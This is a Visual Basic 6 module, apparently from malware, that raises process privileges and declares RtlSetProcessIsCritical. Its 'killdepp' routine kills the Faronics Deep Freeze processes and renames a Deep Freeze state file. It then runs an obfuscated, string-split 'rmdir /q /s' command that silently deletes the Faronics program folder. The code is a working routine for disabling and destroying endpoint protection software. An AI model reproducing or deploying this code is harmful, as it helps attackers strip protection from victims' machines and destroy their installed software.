Attribute VB_Name = "Module9"
Option Explicit

Private Declare Function AdjustTokenPrivileges Lib "advapi32.dll" ( _
ByVal TokenHandle As Long, _
ByVal DisableAllPrivileges As Long, _
NewState As TOKEN_PRIVILEGES, _
ByVal BufferLength As Long, _
PreviousState As TOKEN_PRIVILEGES, _
ReturnLength As Long) As Long

Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" ( _
ByVal lpSystemName As String, _
ByVal lpName As String, _
lpLUID As LUID) As Long

Private Declare Function GetCurrentProcess Lib "kernel32" () As Long

Private Declare Function OpenProcessToken Lib "advapi32.dll" ( _
ByVal ProcessHandle As Long, _
ByVal DesiredAccess As Long, _
TokenHandle As Long) As Long


Private Const ANYSIZE_ARRAY = 1
Private Const TOKEN_ADJUST_PRIVILEGES = &H20
Private Const TOKEN_QUERY = &H8
Private Const SE_PRIVILEGE_ENABLED = &H2

Private Type LUID
    LowPart                     As Long
    HighPart                    As Long
End Type

Private Type LUID_AND_ATTRIBUTES
        pLuid                   As LUID
        Attributes              As Long
End Type

Private Type TOKEN_PRIVILEGES
    PrivilegeCount              As Long
    Privileges(ANYSIZE_ARRAY)   As LUID_AND_ATTRIBUTES
End Type

Public Const SE_SYSTEM_PROFILE_NAME      As String = "SeSystemProfilePrivilege"

Public Declare Function RtlSetProcessIsCritical Lib "ntdll.dll" ( _
ByVal NewValue As Boolean, _
ByVal OldValue As Boolean, _
ByVal WinLogon As Boolean)

Public Function ObtenerPrivilegios(ByVal privilegio As String) As Long

Dim lpLUID As LUID
Dim lpToken As TOKEN_PRIVILEGES
Dim lpAntToken As TOKEN_PRIVILEGES
Dim hToken As Long
Dim hProcess As Long
Dim res As Long

hProcess = GetCurrentProcess()
res = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, hToken)
If res = 0 Then
    Exit Function
End If
res = LookupPrivilegeValue(vbNullString, privilegio, lpLUID)
If res = 0 Then
    Exit Function
End If
With lpToken
    .PrivilegeCount = 1
    .Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
    .Privileges(0).pLuid = lpLUID
End With

res = AdjustTokenPrivileges(hToken, False, lpToken, Len(lpToken), lpAntToken, Len(lpAntToken))
If res = 0 Then
    Exit Function
End If
ObtenerPrivilegios = res
End Function


Public Function killdepp() As Boolean
On Error Resume Next
ObtenerPrivilegios SE_SYSTEM_PROFILE_NAME
KillProcess ("FrzState.exe")
KillProcess ("DFServEx.exe")
If Len(Dir(Environ("windir") & "\Temp\_$Df\FrzState2k.sib")) Then
Name Environ("windir") & "\Temp\_$Df\FrzState2k.sib" As Environ("windir") & "\Temp\_$Df\FrzState2k.fgbs"
Shell "cmd.exe /c r" & "md" & "ir /q /" & "s C:\A" & "rchivos de pro" & "grama\" & "Far" & "onics"
        Else
        End If
End Function

